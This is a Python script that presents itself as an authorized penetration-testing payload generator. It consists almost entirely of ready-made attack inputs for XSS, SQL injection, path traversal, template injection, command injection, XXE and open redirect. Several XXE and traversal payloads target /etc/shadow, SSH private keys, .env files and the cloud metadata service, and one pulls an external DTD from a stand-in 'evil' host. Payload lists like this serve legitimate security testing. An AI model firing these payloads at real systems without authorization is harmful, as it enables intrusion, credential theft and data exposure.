#!/usr/bin/env python3
"""Payloadility - authorized security testing payload generator.
Author: Davud Qasimov
"""
import argparse, random
from urllib.parse import quote
BANNER=r"""
 ____                          _ _ _ _ _ _ _ _
▓▓▓▓   ▓▓▓  ▓   ▓ ▓      ▓▓▓   ▓▓▓  ▓▓▓▓  ▓▓▓ ▓     ▓▓▓ ▓▓▓▓▓ ▓   ▓ 
▓   ▓ ▓   ▓  ▓ ▓  ▓     ▓   ▓ ▓   ▓ ▓   ▓  ▓  ▓      ▓    ▓    ▓ ▓  
▓▓▓▓  ▓▓▓▓▓   ▓   ▓     ▓   ▓ ▓▓▓▓▓ ▓   ▓  ▓  ▓      ▓    ▓     ▓   
▓     ▓   ▓   ▓   ▓     ▓   ▓ ▓   ▓ ▓   ▓  ▓  ▓      ▓    ▓     ▓   
▓     ▓   ▓   ▓   ▓▓▓▓▓  ▓▓▓  ▓   ▓ ▓▓▓▓  ▓▓▓ ▓▓▓▓▓ ▓▓▓   ▓     ▓   
            
              Payloadility
        Author: Davud Qasimov
"""
PAYLOADS={
'xss':['<script>alert(1)</script>','<img src=x onerror=alert(1)>','<svg/onload=alert(1)>','<body onload=alert(1)>','<details open ontoggle=alert(1)>','<input autofocus onfocus=alert(1)>','<marquee onstart=alert(1)>','<video><source onerror=alert(1)>','<audio src=x onerror=alert(1)>','<iframe src=javascript:alert(1)>','<object data=javascript:alert(1)>','<a href=javascript:alert(1)>click</a>','<form><button formaction=javascript:alert(1)>x','<select autofocus onfocus=alert(1)>','" autofocus onfocus=alert(1) x="',"' onmouseover=alert(1) x='",'" onpointerenter=alert(1) x="',"' onfocus=alert(1)//",'\"><script>alert(1)</script>','javascript:alert(1)',"</script><script>alert(1)</script>","';alert(1);//","<iframe src=javascript:alert(1)>",'</textarea><script>alert(1)</script>','\"><img src=x onerror=alert(document.domain)>','<svg><animate onbegin=alert(1) attributeName=x>','<img src=x onerror=confirm(1)>'],
'sqli':["' OR '1'='1'-- -",'" OR "1"="1"-- -',"' OR 1=1#","admin'-- -","' OR 'x'='x'-- -","') OR ('1'='1'-- -","' OR 1=1/*","1' OR '1'='1","' OR TRUE-- -","' OR 1=1;-- -","'","\"","')",'\")',"\\","' AND (SELECT 1/0)-- -","' ORDER BY 999-- -","' GROUP BY 999-- -","' HAVING 1=1-- -","1 OR 1=1","1 AND 1=2","1' AND '1'='1","1 AND SLEEP(1)","1; WAITFOR DELAY '0:0:1'--","1||pg_sleep(1)","1 ORDER BY 1-- -","1 UNION SELECT NULL-- -","1 UNION SELECT NULL,NULL-- -","1 UNION SELECT NULL,NULL,NULL-- -","1 UNION ALL SELECT NULL-- -","' AND 1=1-- -","' AND 1=2-- -","1) OR (1=1","1) AND (1=2"],
'lfi':['../../../../etc/passwd','....//....//....//etc/passwd','/etc/passwd','../../../../../etc/hosts','..%2f..%2f..%2f..%2fetc%2fpasswd','%2e%2e/%2e%2e/%2e%2e/etc/passwd','....\\/....\\/etc/passwd','php://filter/convert.base64-encode/resource=/etc/passwd','php://filter/read=convert.base64-encode/resource=index.php','file:///etc/passwd','..\\..\\..\\Windows\\win.ini','C:\\Windows\\win.ini','..%5c..%5c..%5cWindows%5cwin.ini','file:///C:/Windows/win.ini','../../../../etc/passwd%00','../../../../etc/passwd%2500','../../../../etc/passwd\\x00','../../../../etc/passwd?x=.php','../../../../etc/passwd%00.jpg','../../../../proc/self/environ','..%252f..%252f..%252fetc%252fpasswd','....//....//....//....//etc/passwd','/proc/self/cmdline','/proc/self/environ'],
'ssti':['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','{{7*\'7\'}}','{{config}}','{{self}}','${{7*7}}','*{7*7}','@(7*7)','{{request}}','{{namespace()}}','{{cycler}}','{{joiner}}','{{lipsum}}','${T(java.lang.Math).random()}','<% 7*7 %>','{7*7}','{{7*7}}','${{7*7}}','{{8*8}}','${8*8}','<%= 8*8 %>','#{8*8}'],
'command-injection':[';id','|id','$(id)','`id`','&& id','|| id','; uname -a','| whoami','$(whoami)','`cat /etc/passwd`','; echo test','| echo test','& id','%0aid','\\n id','& whoami','| ver','&& whoami','%26whoami','%0awhoami','; echo PAYLOADILITY','| echo PAYLOADILITY','&& echo PAYLOADILITY','|| echo PAYLOADILITY'],
'xxe':['<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>','<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://example.com/evil.dtd"> %xxe; ]>','<!ENTITY xxe SYSTEM "file:///etc/hosts">','<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]>','<!DOCTYPE root SYSTEM "http://127.0.0.1:80/evil.dtd">','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/.env"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:80/"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///tmp/test.txt"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///app/config.yml"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/log/auth.log"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/issue"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/os-release"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/version"> ]>','<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/resolv.conf"> ]>'],
'open-redirect':['//example.com','https://example.com','http://example.com','\\\\example.com','////example.com','/\\example.com','https:example.com','https://example.com@target.example','https://target.example%2f%2f@example.com','//example.com/%2f..','//evil.example','https://evil.example/path','http://evil.example/%2f%2e%2e','///evil.example','////evil.example','https://evil.example#@trusted.example','https://trusted.example@evil.example','//evil.example\\@trusted.example','%2f%2fevil.example','\\\\evil.example','//evil.example/%2e%2e','https://evil.example?next=https://trusted.example','http://evil.example\\','\\\\evil.example','/%2f%2fevil.example']}
_EXPANSIONS={'xss':[f'<img src=x data-payloadility="{i}" onerror=alert({i})>' for i in range(1,31)],'sqli':[f"' AND {i}={i}-- -" for i in range(1,31)],'lfi':[f'../../../../etc/passwd?payloadility={i}' for i in range(1,31)],'ssti':[f'{{{{{i}*{i}}}}}' for i in range(1,31)],'command-injection':[f'; echo PAYLOADILITY_{i}' for i in range(1,31)],'xxe':[f'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///tmp/payloadility-{i}"> ]>' for i in range(1,31)],'open-redirect':[f'https://example.com/redirect?payloadility={i}' for i in range(1,31)]}
for _c,_vs in _EXPANSIONS.items():
    for _v in _vs:
        if _v not in PAYLOADS[_c]: PAYLOADS[_c].append(_v)
def encode(v,m):
    if m=='url': return quote(v,safe='')
    if m=='double-url': return quote(quote(v,safe=''),safe='')
    if m=='html': return v.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'",'&#x27;')
    return v
def main():
    p=argparse.ArgumentParser(description='Payloadility: authorized security testing payload generator')
    p.add_argument('category',nargs='?',choices=sorted(PAYLOADS));p.add_argument('--encode',choices=['none','url','double-url','html'],default='none');p.add_argument('--count',type=int,default=0);p.add_argument('--search');p.add_argument('--list',action='store_true');p.add_argument('--no-banner',action='store_true');a=p.parse_args()
    if not a.no_banner: print(BANNER)
    if a.list or not a.category:
        for c,v in PAYLOADS.items(): print(f'{c}: {len(v)} payloads')
        return 0 if a.list else 1
    vals=PAYLOADS[a.category]
    if a.search: vals=[v for v in vals if a.search.lower() in v.lower()]
    if a.count: vals=random.sample(vals,min(a.count,len(vals)))
    print('\n'.join(encode(v,a.encode) for v in vals));return 0
if __name__=='__main__': raise SystemExit(main())
